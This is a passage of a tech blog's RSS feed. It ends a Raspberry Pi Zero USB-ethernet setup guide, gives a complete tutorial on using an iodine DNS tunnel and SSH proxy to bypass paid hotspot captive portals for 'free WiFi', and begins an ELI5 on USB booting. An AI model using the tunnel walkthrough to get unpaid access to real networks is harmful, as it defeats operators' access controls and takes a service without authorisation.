+<pre>dd bs=4M if=2017-09-07-raspbian-stretch-lite.img of=/dev/mmcblk1 conv=fsync #change /dev/mmcblk1</pre>
+<pre class="output">442+1 records in
+442+1 records out
+1854590976 bytes (1.9 GB, 1.7 GiB) copied, 99.8628 s, 18.6 MB/s</pre>
+<p><strong>Resize partition to full disk: </strong><em>(Optional)</em></p>
+<pre>fdisk /dev/mmcblk1 #change /dev/mmcblk1 to your device</pre>
+<pre class="output">Welcome to fdisk (util-linux 2.30.2).
+Changes will remain in memory only, until you decide to write them.
+Be careful before using the write command.
+<strong>Command (m for help): p</strong>
+Disk /dev/mmcblk1: 29.8 GiB, 32026656768 bytes, 62552064 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+Disklabel type: dos
+Disk identifier: 0x11eccc69
+Device Boot Start End Sectors Size Id Type
+/dev/mmcblk1p1 8192 93813 85622 41.8M c W95 FAT32 (LBA)
+/dev/mmcblk1p2 94208 62552063 62457856 29.8G 83 Linux
+<strong>Command (m for help): d</strong>
+<strong>Partition number (1,2, default 2): 2</strong>
+Partition 2 has been deleted.
+<strong>Command (m for help): n</strong>
+Partition type
+ p primary (1 primary, 0 extended, 3 free)
+ e extended (container for logical partitions)
+<strong>Select (default p): p</strong>
+<strong>Partition number (2-4, default 2): 2</strong>
+<strong>First sector (2048-62552063, default 2048): 94208</strong>
+Last sector, +sectors or +size{K,M,G,T,P} (94208-62552063, default 62552063):
+Created a new partition 2 of type 'Linux' and of size 29.8 GiB.
+Partition #2 contains a ext4 signature.
+<strong>Do you want to remove the signature? [Y]es/[N]o: n</strong><strong>
+Command (m for help): w</strong>
+The partition table has been altered.
+Calling ioctl() to re-read partition table.
+Syncing disks.</pre>
+<p>At this point you will have a working operating system.</p>
+<h2>Configuring the device</h2>
+<p>Now that you having a working image, it is time to change some files with settings to make you able to connect to it. This will be achieved by configuring the OTG-port (micro-usb port marked with &#8220;USB&#8221;) to emulate an Ethernet-to-USB dongle. With a working connection, we will be able to log in through SSH.</p>
+<p><strong>Mount both partitions:</strong></p>
+<pre>mkdir boot
+mount /dev/mmcblk1p1 boot
+mkdir root
+mount /dev/mmcblk1p2 root</pre>
+<p><strong>Setup USB-gadget, Ethernet-to-USB:</strong></p>
+<p>Add a line to boot/config.txt, using this command;</p>
+<pre>echo 'dtoverlay=dwc2' &gt;&gt; boot/config.txt</pre>
+<p>After the command &#8216;rootwait&#8217; in boot/cmdline.txt add the following command (keep it as one line);</p>
+<pre># boot/cmdline.txt
+... rootwait modules-load=dwc2,g_ether ...</pre>
+<p>This will load the kernel-module needed and emulate a Ethernet-to-USB device on the USB port. You can also change this after the device is booted, but we have no other way of accessing the device, so we want this behavior on boot.</p>
+<p><strong>Configure a static IP:</strong></p>
+<p>Open the file root/etc/network/interfaces and add the following snippet to the end of the file:</p>
+<pre><span class="pln"># root/etc/network/interfaces
+allow</span><span class="pun">-</span><span class="pln">hotplug usb0
+</span><span class="pln">iface usb0 inet </span><span class="kwd">static
+</span><span class="pln">address </span><span class="lit">192.168</span><span class="pun">.</span><span class="lit">7.2
+</span><span class="pln">netmask </span><span class="lit">255.255</span><span class="pun">.</span><span class="lit">255.0
+</span><span class="pln">network </span><span class="lit">192.168</span><span class="pun">.</span><span class="lit">7.0
+</span><span class="pln">broadcast </span><span class="lit">192.168</span><span class="pun">.</span><span class="lit">7.255
+</span><span class="pln">gateway </span><span class="lit">192.168</span><span class="pun">.</span><span class="lit">7.1
+</span></pre>
+<p>If the device is connected with its emulated ethernet-device, we will know its IP without using a DHCP-server or discovery-service.</p>
+<p><strong>Enable SSH-server (headless way):</strong></p>
+<p>SSH-server was enabled on the early versions but there was <a href="https://www.raspberrypi.org/documentation/remote-access/ssh/">a security issue</a> for many people who were not aware of this. To make it easy to enable this feature you can put an empty file named &#8216;ssh&#8217; on the boot partition and it will enable it for you (the file will be gone after).</p>
+<pre>touch boot/ssh</pre>
+<p><strong>Unmount the SD-card:</strong></p>
+<pre>sync
+unmount boot root</pre>
+<h2>Using the device</h2>
+<p>If everything is set up correctly, you can use a micro-USB to USB-A (regular charging cable) to connect your device with the &#8220;USB&#8221; marked port to your computer (or any other device with a terminal). The connection will give both a 5V power and a data-connection to your Pi. After plugging the device in, the ACT light will start blinking if the SD-card has a bootable operating system on it. The first time the boot up process will take longer, but normally this takes about 10 seconds.</p>
+<p><img data-attachment-id="853" data-permalink="https://demgeeks.com/hackotg-v1-0-universal-portable-security-platform/rpizero_demarrage/" data-orig-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/RPiZero_Demarrage.jpg?fit=1414%2C795&amp;ssl=1" data-orig-size="1414,795" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;2.4&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;SM-G800F&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1469896769&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.3&quot;,&quot;iso&quot;:&quot;160&quot;,&quot;shutter_speed&quot;:&quot;0.03030303030303&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="RPiZero_Demarrage" data-image-description="" data-medium-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/RPiZero_Demarrage.jpg?fit=300%2C169&amp;ssl=1" data-large-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/RPiZero_Demarrage.jpg?fit=640%2C360&amp;ssl=1" class="alignnone wp-image-853 size-full" src="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/RPiZero_Demarrage.jpg?resize=640%2C360&#038;ssl=1" alt="" srcset="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/RPiZero_Demarrage.jpg?w=1414&amp;ssl=1 1414w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/RPiZero_Demarrage.jpg?resize=300%2C169&amp;ssl=1 300w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/RPiZero_Demarrage.jpg?resize=768%2C432&amp;ssl=1 768w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/RPiZero_Demarrage.jpg?resize=1024%2C576&amp;ssl=1 1024w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/RPiZero_Demarrage.jpg?resize=640%2C360&amp;ssl=1 640w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/RPiZero_Demarrage.jpg?w=1280&amp;ssl=1 1280w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" /></p>
+<p>On Linux, you can check your interfaces by issuing the command:</p>
+<pre>ifconfig</pre>
+<p>If everything is working properly, you&#8217;ll see this new interface;</p>
+<pre class="output">...
+usb0: flags=4163&lt;up,broadcast,running,multicast&gt; mtu 1500
+     inet6 fe80::a8ac:4ff:fe31:3a2e prefixlen 64 scopeid 0x20
+     ether aa:ac:04:31:3a:2e txqueuelen 1000 (Ethernet)
+     RX packets 28 bytes 3312 (3.2 KiB)
+     RX errors 0 dropped 0 overruns 0 frame 0
+     TX packets 5 bytes 734 (734.0 B)
+     TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
+...&lt;/up,broadcast,running,multicast&gt;</pre>
+<p>To be able to SSH to the device we will need an IP ourselves. There is no DHCP-server on this 2-man network so we will give us one ourselves (in the same netmask). Use this command: (You&#8217;ll have to do this every time you plug in the device)</p>
+<pre>ifconfig usb0 192.168.7.3</pre>
+<p>Now you can SSH to this device with the default credentials (user: pi, pass: raspberry):</p>
+<pre>ssh pi@192.168.7.2</pre>
+<h2>What next?</h2>
+<p>Now that we have the basics figured out, in the next version we will hack the hardware to make the device include a USB-port so it is truly portable.<br />
+In the rest of the series we will start building our universal hacking/debugging tool so we can connect to it over WiFi and use its emulation capabilities to demonstrate physical attack-vectors.</p>
+<p><em>You can find the next one here:</em></p>
+<blockquote class="wp-embedded-content" data-secret="HpdD86nrmQ"><p><a href="https://demgeeks.com/hackotg-v1-1-integrating-the-cable-for-more-portability/">HackOTG (v1.1): Integrating the cable for more portability</a></p></blockquote>
+<p><iframe class="wp-embedded-content" sandbox="allow-scripts" security="restricted" src="https://demgeeks.com/hackotg-v1-1-integrating-the-cable-for-more-portability/embed/#?secret=HpdD86nrmQ" data-secret="HpdD86nrmQ" width="600" height="338" title="&#8220;HackOTG (v1.1): Integrating the cable for more portability&#8221; &#8212; Dem Geeks" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe></p>
+<p>The post <a rel="nofollow" href="https://demgeeks.com/hackotg-v1-0-universal-portable-security-platform/">HackOTG (v1.0): A universal, portable, security-platform</a> appeared first on <a rel="nofollow" href="https://demgeeks.com">Dem Geeks</a>.</p>
+]]></content:encoded>
+			<wfw:commentRss>https://demgeeks.com/hackotg-v1-0-universal-portable-security-platform/feed/</wfw:commentRss>
+		<slash:comments>4</slash:comments>
+	<post-id xmlns="com-wordpress:feed-additions:1">821</post-id>	</item>
+		<item>
+		<title>Hack: Get free WiFi on paid-access hotspots with a DNS tunnel</title>
+		<link>https://demgeeks.com/hack-get-free-wifi-on-paid-access-hotspots/</link>
+		<comments>https://demgeeks.com/hack-get-free-wifi-on-paid-access-hotspots/#comments</comments>
+		<pubDate>Tue, 03 Oct 2017 15:34:58 +0000</pubDate>
+		<dc:creator><![CDATA[Lars Veelaert]]></dc:creator>
+				<category><![CDATA[Hacking]]></category>
+		<category><![CDATA[anonimity]]></category>
+		<category><![CDATA[archlinux]]></category>
+		<category><![CDATA[bypass]]></category>
+		<category><![CDATA[captive portal]]></category>
+		<category><![CDATA[dns]]></category>
+		<category><![CDATA[domain]]></category>
+		<category><![CDATA[hacking]]></category>
+		<category><![CDATA[hostname]]></category>
+		<category><![CDATA[internet]]></category>
+		<category><![CDATA[iodine]]></category>
+		<category><![CDATA[ip]]></category>
+		<category><![CDATA[linux]]></category>
+		<category><![CDATA[Nameserver]]></category>
+		<category><![CDATA[network]]></category>
+		<category><![CDATA[networking]]></category>
+		<category><![CDATA[port-forwarding]]></category>
+		<category><![CDATA[proxy]]></category>
+		<category><![CDATA[security]]></category>
+		<category><![CDATA[server]]></category>
+		<category><![CDATA[ssh]]></category>
+		<category><![CDATA[terminal]]></category>
+		<category><![CDATA[tunneling]]></category>
+		<category><![CDATA[vpn]]></category>
+
+		<guid isPermaLink="false">http://www.demgeeks.com/?p=259</guid>
+		<description><![CDATA[<p>Everybody knows that you can&#8217;t connect to a WiFi-hotspot if it is secured and you don&#8217;t have a the password. But at airports, train-stations or homes with a routers from a big provider you will have a unsecured wifi hotspot, but when you connect to it and you open your browser, you will get prompted [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://demgeeks.com/hack-get-free-wifi-on-paid-access-hotspots/">Hack: Get free WiFi on paid-access hotspots with a DNS tunnel</a> appeared first on <a rel="nofollow" href="https://demgeeks.com">Dem Geeks</a>.</p>
+]]></description>
+				<content:encoded><![CDATA[<p>Everybody knows that you can&#8217;t connect to a WiFi-hotspot if it is secured and you don&#8217;t have a the password. But at airports, train-stations or homes with a routers from a big provider you will have a unsecured wifi hotspot, but when you connect to it and you open your browser, you will get prompted to log in or supply a credit card, etc&#8230; . Great if you have a login but otherwise you are stuck behind this <a href="https://en.wikipedia.org/wiki/Captive_portal">&#8216;captive&#8217; portal</a> (that is what this page is called).</p>
+<h2>How to bypass a captive portal</h2>
+<p>Often you can bypass a captive portal page by using DNS tunneling. You can test if this attack is possible by trying to ping google.com. Try this command;</p>
+<pre>ping www.google.com</pre>
+<pre class="output">[root@localhost ~]# ping www.google.com
+PING www.google.com (172.217.17.36) 56(84) bytes of data.</pre>
+<p>You don&#8217;t need to get a PING back, but you can see that www.google.com resolved to 172.217.17.36, this means that DNS is still working&#8230; strange if you don&#8217;t have an internet connection right?<br />
+So this means that <a href="https://nl.wikipedia.org/wiki/Domain_Name_System">DNS</a> is still working. If we give the router a domain, it will resolve it by sending it to a nameserver and it will keep searching till if finds the IP, which it will send back to us. Now if you specify a <a href="https://en.wikipedia.org/wiki/Subdomain">subdomain</a> (&#8220;mail&#8221; in mail.google.com) it will ask the nameserver of the subdomain (if it exists) to give the right IP and relay it back.</p>
+<p>This means that if we control the subdomain we are looking up, and we control the nameserver assosiated with it, we can decide which IP (or <a href="https://en.wikipedia.org/wiki/List_of_DNS_record_types">better DNS record</a>) to send back. The result is that we can upload data through an extra attached subdomain and download data encoded in the DNS-record that is send back. This process is called DNS-tunneling. To encode this data, there are multiple tools available but <a href="http://code.kryo.se/iodine/">iodine</a> is a great one, and this is that is used in this article.</p>
+<h2>What you need to setup:</h2>
+<ul>
+<li>Spare (Linux) machine at home, this can be an existing server or desktop.</li>
+<li><a href="https://en.wikipedia.org/wiki/Dynamic_DNS">Dynamic DNS</a> that resolves to public IP of server (explained in this article)</li>
+<li>A subdomain that holds a NAMESERVER-record (explained in this article)</li>
+<li><a href="http://code.kryo.se/iodine/">Iodine</a>-daemon on the server (explained in this article)</li>
+<li>Router which you can setup with static IP&#8217;s and <a href="https://en.wikipedia.org/wiki/Port_forwarding">Port forwarding</a></li>
+</ul>
+<h2>Setting up the DDNS and NS-record</h2>
+<p>You can use <a href="https://freedns.afraid.org/">freedns.afraid.org</a> for the <a href="https://en.wikipedia.org/wiki/Dynamic_DNS">dynamic DNS</a> and the <a href="https://en.wikipedia.org/wiki/List_of_DNS_record_types#NS">NS-record</a>. So make an account and go to &#8220;subdomains&#8221;. You need to make 2 subdomains. One is a normal A-record (domain name to IP) and one of the type NS that is redirected to the A-record so it points to the public IP of the server at home.</p>
+<p><img data-attachment-id="803" data-permalink="https://demgeeks.com/hack-get-free-wifi-on-paid-access-hotspots/screenshot-2017-10-03-at-17-15-46/" data-orig-file="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-03-at-17.15.46-e1507071452319.png?fit=377%2C258&amp;ssl=1" data-orig-size="377,258" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot 2017-10-03 at 17.15.46" data-image-description="" data-medium-file="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-03-at-17.15.46-e1507071452319.png?fit=300%2C205&amp;ssl=1" data-large-file="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-03-at-17.15.46-e1507071452319.png?fit=377%2C258&amp;ssl=1" class="alignnone wp-image-803 size-full" src="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-03-at-17.15.46-e1507071452319.png?resize=377%2C258&#038;ssl=1" alt="" srcset="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-03-at-17.15.46-e1507071452319.png?w=377&amp;ssl=1 377w, https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-03-at-17.15.46-e1507071452319.png?resize=300%2C205&amp;ssl=1 300w" sizes="(max-width: 377px) 100vw, 377px" data-recalc-dims="1" /><br />
+For the A-record fill in a sub domain (can be anything, just remember it) and choose a domain (these are donated by a large community to use). fill in the captcha and done.<br />
+The NS-record do the same, but change the destination to the A-record you just made (&lt;subdomain&gt;.&lt;domain&gt;).</p>
+<p>The IP of the A-record was auto-filled when the subdomain was created but it needs to be periodicly updated by the server, so it keeps pointing at the public IP of you home-router with the server behind it. There are many ways to do this (<a href="https://freedns.afraid.org/scripts/freedns.clients.php">can be found here</a>), but one of the easiest is fetching an url with a curl-command every 60 seconds.If you go to <a href="https://freedns.afraid.org/dynamic/">freedns.afraid.org/dynamic</a>, you can choose your subdomain of your A-record and get the link behind &#8216;direct link&#8217;.</p>
+<p><img data-attachment-id="801" data-permalink="https://demgeeks.com/hack-get-free-wifi-on-paid-access-hotspots/screenshot-2017-10-03-at-15-27-27/" data-orig-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-03-at-15.27.27.png?fit=812%2C109&amp;ssl=1" data-orig-size="812,109" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot 2017-10-03 at 15.27.27" data-image-description="" data-medium-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-03-at-15.27.27.png?fit=300%2C40&amp;ssl=1" data-large-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-03-at-15.27.27.png?fit=640%2C86&amp;ssl=1" class="alignnone wp-image-801 size-full" src="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-03-at-15.27.27.png?resize=640%2C86&#038;ssl=1" alt="" srcset="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-03-at-15.27.27.png?w=812&amp;ssl=1 812w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-03-at-15.27.27.png?resize=300%2C40&amp;ssl=1 300w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-03-at-15.27.27.png?resize=768%2C103&amp;ssl=1 768w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-03-at-15.27.27.png?resize=640%2C86&amp;ssl=1 640w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" /></p>
+<p>It looks like this:</p>
+<pre>https://freedns.afraid.org/dynamic/update.php?&lt;your-key&gt;</pre>
+<p><strong>ddns.sh:</strong></p>
+<pre class="output">while true
+do
+    curl https://freedns.afraid.org/dynamic/update.php?&lt;your-key&gt;
+    sleep 60
+done</pre>
+<p>Put this on the server at home. This is a script that calls the url every 60 seconds so it keeps updated over time. You probably want to execute it on boot. On a system with systemd you can use this service file:</p>
+<p><strong>/usr/lib/systemd/system/ddns.service:</strong></p>
+<pre class="output">[Unit]
+After=network.target
+Requires=network.target
+
+[Service]
+ExecStart=/usr/bin/sh /root/ddns.sh
+
+[Install]
+WantedBy=multi-user.target</pre>
+<p>Then run these commands to check if it works and if so, make it persistent.</p>
+<pre>sudo systemctl start ddns.service</pre>
+<p>sudo systemctl status ddns.service #check if ok sudo systemctl enable ddns.service #make it persistant over boot</p>
+<p>Now if you ping your A-record subdomain you will get the IP of your router at home. The ddns.service will keep it that way.</p>
+<h2>Configuring the Iodine-daemon</h2>
+<p>First you have to install the iodine program on the server at home, find it in the repository as &#8220;iodine&#8221; or &#8220;iodine-server&#8221;. For Arch-Linux this is the following command:</p>
+<pre>pacman -Sy iodine</pre>
+<p>Now you want to configure the daemon with the info of your record and make it start at boot. This is the command that has to run on boot:</p>
+<pre>/usr/bin/iodined -f -c -l $IODINE_BIND_ADDRESS -n $IODINE_EXT_IP -p $IODINE_PORT -P $IODINE_PASSWORD -u $IODINE_USER $TUN_IP $TOP_DOMAIN</pre>
+<p>On Arch-Linux the service file is already supplied and the settings can be found at <strong>/etc/conf.d/iodined</strong>:<strong> </strong>(you only need TOP_DOMAIN and IODINE_PASSWORD)</p>
+<pre class="output"># Address and subnet to use for the tunnel (default mask is /27)
+ TUN_IP="172.18.42.1/24"
+
+# Password (32 characters max)
+ IODINE_PASSWORD="mypassword"
+
+# The domain you control, see documentation.
+ TOP_DOMAIN="&lt;subdomain&gt;.&lt;domain&gt;.com"
+
+# UDP port iodined should listen on.
+ IODINE_PORT="53"
+
+# Local IP address iodined should bind to.
+ IODINE_BIND_ADDRESS="0.0.0.0"
+
+# External IP of your iodined server, used in DNS answers.
+ IODINE_EXT_IP=""
+
+# The user iodined should run as.
+ IODINE_USER="nobody"</pre>
+<p>When ready run these commands to make it run at boot on an Arch-Linux system:</p>
+<pre>sudo systemctl start iodined.service
+sudo systemctl status iodined.service
+sudo systemctl enable iodined.service</pre>
+<p><em>Note: You really want to set a password, this is not for encryption, this is not encrypted in any way, but for authentication, so not everybody can use your DNS-tunnel. </em></p>
+<p>Now you need to port-forward port 53 (the port DNS uses) on your home-router to your device, used as server. This is different for every router but generally you also want to make the internal IP &#8220;static&#8221; for this device so it does not change after a reboot. Now your Iodine-daemon is accessible from outside of your network.</p>
+<p>You can check if everything is properly setup by filling it in on this page <a href="http://code.kryo.se/iodine/check-it/">http://code.kryo.se/iodine/check-it/</a>. It will tell you were it failed if something is not in order. If it works, let&#8217;s bypass some captive portals!</p>
+<h2>Usage</h2>
+<p>You should install the <a href="http://code.kryo.se/iodine/">iodine</a>-client before you get stuck somewhere without internet.<br />
+It is found in many repositories as &#8220;iodine&#8221; or &#8220;iodine-client&#8221;. On Arch-Linux:</p>
+<pre>pacman -Sy iodine</pre>
+<p>Then to use this technique when you are behind a captive portal, make sure you are connected to the hotspot. Then, when you have confirmed there is a hole in the security of the captive portal with the ping method described in the first part of this article, run the following command. (it will ask a password if set)</p>
+<pre>iodine &lt;subdomain&gt;.&lt;domain&gt;</pre>
+<pre class="output">Enter password:
+Opened dns0 
+Opened IPv4 UDP socket 
+Sending DNS queries for ****.****.*** to 192.168.1.1
+Autodetecting DNS query type (use -T to override).
+Using DNS type NULL queries 
+Version ok, both using protocol v 0x00000502. You are user #0 
+Setting IP of dns0 to 172.18.42.2 
+Setting MTU of dns0 to 1130 
+Server tunnel IP is 172.18.42.1 
+Testing raw UDP data to the server (skip with -r) 
+Server is at 192.168.1.2, trying raw login: OK 
+Sending raw traffic directly to 192.168.1.2
+Connection setup complete, transmitting data. 
+Detaching from terminal...</pre>
+<p>Awesome! We have a tunnel. Now we can contact every port on the server at 172.18.42.1, for example we can SSH to the server:</p>
+<pre>ssh user@172.18.42.1</pre>
+<p>Now to tunnel a internet connection through, you can use the built in SOCKS-proxy of SSH. To use it supply the -D option with a local port to put the proxy on. All your internet will be tunneled over the ssh-connection if you specify the proxy in your program. example of the command:</p>
+<pre>ssh user@172.18.42.1 -D 5000</pre>
+<p>Research how to setup your programs on your system to use the proxy or use this quick tip which explains how to <a href="https://demgeeks.com/tip-running-a-terminal-command-through-a-proxy/">run commands through a proxy.</a> There is also a transparent way that tunnels all internet through a ssh tunnel <a href="https://demgeeks.com/qt-poor-man-vpn/">explained here</a>.</p>
+<p>Hope you learned something about how the internet works and have some free internet in the meanwhile. Have fun!</p>
+<p>The post <a rel="nofollow" href="https://demgeeks.com/hack-get-free-wifi-on-paid-access-hotspots/">Hack: Get free WiFi on paid-access hotspots with a DNS tunnel</a> appeared first on <a rel="nofollow" href="https://demgeeks.com">Dem Geeks</a>.</p>
+]]></content:encoded>
+			<wfw:commentRss>https://demgeeks.com/hack-get-free-wifi-on-paid-access-hotspots/feed/</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+	<post-id xmlns="com-wordpress:feed-additions:1">259</post-id>	</item>
+		<item>
+		<title>ELI5: How to boot a different operating system with a bootable USB drive</title>
+		<link>https://demgeeks.com/eli5-boot-different-operating-system-bootable-usb-drive/</link>
+		<comments>https://demgeeks.com/eli5-boot-different-operating-system-bootable-usb-drive/#comments</comments>
+		<pubDate>Sat, 30 Sep 2017 10:58:52 +0000</pubDate>
+		<dc:creator><![CDATA[Lars Veelaert]]></dc:creator>
+				<category><![CDATA[ELI5]]></category>
+		<category><![CDATA[bios]]></category>
+		<category><![CDATA[boot order]]></category>
+		<category><![CDATA[development]]></category>
+		<category><![CDATA[hardware]]></category>
+		<category><![CDATA[linux]]></category>
+		<category><![CDATA[mac]]></category>
+		<category><![CDATA[mac osx]]></category>
+		<category><![CDATA[macos]]></category>
+		<category><![CDATA[os]]></category>
+		<category><![CDATA[productivity]]></category>
+		<category><![CDATA[usb]]></category>
+		<category><![CDATA[windows]]></category>
+
+		<guid isPermaLink="false">https://demgeeks.com/?p=752</guid>
+		<description><![CDATA[<p>Most devices come with a operating system (Windows, MacOs, Linux, Android, IOS, &#8230; ) already installed on your hard drive. That means that when the device boots, it has to know where to look. Various systems exist for this specific task, but the most common one is BIOS. A small, programmed chip on your motherboard [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://demgeeks.com/eli5-boot-different-operating-system-bootable-usb-drive/">ELI5: How to boot a different operating system with a bootable USB drive</a> appeared first on <a rel="nofollow" href="https://demgeeks.com">Dem Geeks</a>.</p>
+]]></description>
+				<content:encoded><![CDATA[<p>Most devices come with a operating system (Windows, MacOs, Linux, Android, IOS, &#8230; ) already installed on your hard drive. That means that when the device boots, it has to know where to look. Various systems exist for this specific task, but the most common one is <a href="https://nl.wikipedia.org/wiki/BIOS">BIOS</a>. A small, programmed chip on your motherboard checks each port where a storage medium (Hard drive, CD, Floppy, USB, &#8230;) could be plugged in and reads the first bits of the disk. If it finds one with instructions on how to boot that storage device, it will do so. The order in which all the devices get checked can be changed (more on this later).</p>
+<p>If a storage medium with a bootable signature (found in something called an <a href="https://nl.wikipedia.org/wiki/Master_boot_record">MBR</a>) is found (like mentioned above). The rest of that first portion of data will tell you how the drive is partitioned, and on which location your operating system is located. Your CPU can load in your operating system and your device will boot your operating system.</p>
+<p>There are two things that need to happen if you want to boot another storage device with another operating system:<br />
+1. Your<a href="https://nl.wikipedia.org/wiki/BIOS"> BIOS </a>has to check your storage device first. So it does not boot the normal one first.<br />
+2. That storage device has to have the bootable signature with instructions on how to boot your new operating systems.</p>
+<h2>Changing the BIOS settings</h2>
+<p>When your computer starts, it will often display some white text with keys like (F11, DEL) next to it. If you react before the computer starts to boot, you have options to change the settings or choose the device you want to boot. An example BIOS boot screen is this:</p>
+<p><img data-attachment-id="753" data-permalink="https://demgeeks.com/eli5-boot-different-operating-system-bootable-usb-drive/img_5857968375b93-600x450/" data-orig-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/img_5857968375b93-600x450.png?fit=600%2C450&amp;ssl=1" data-orig-size="600,450" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_5857968375b93-600&#215;450" data-image-description="" data-medium-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/img_5857968375b93-600x450.png?fit=300%2C225&amp;ssl=1" data-large-file="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/img_5857968375b93-600x450.png?fit=600%2C450&amp;ssl=1" class="alignnone wp-image-753 size-full" src="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/img_5857968375b93-600x450.png?resize=600%2C450&#038;ssl=1" alt="" srcset="https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/img_5857968375b93-600x450.png?resize=600%2C450&amp;ssl=1 600w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/img_5857968375b93-600x450.png?resize=300%2C225&amp;ssl=1 300w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/img_5857968375b93-600x450.png?resize=80%2C60&amp;ssl=1 80w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/img_5857968375b93-600x450.png?resize=245%2C184&amp;ssl=1 245w, https://i1.wp.com/demgeeks.com/wp-content/uploads/2017/09/img_5857968375b93-600x450.png?resize=260%2C195&amp;ssl=1 260w" sizes="(max-width: 600px) 100vw, 600px" data-recalc-dims="1" /></p>
+<p>Every device is different, but 99% of them will have a key combination of a physical button to get you into the BIOS settings. Once you&#8217;re in, search for a way to change to boot-order or choose a device to boot. Don&#8217;t forget to save your settings. Again. every system is different but 99% of them supports changing this order. You can always Google the make and model of your device and find out how to change it. Take pictures before changing anything, so you can revert to the earlier state if things fail.</p>
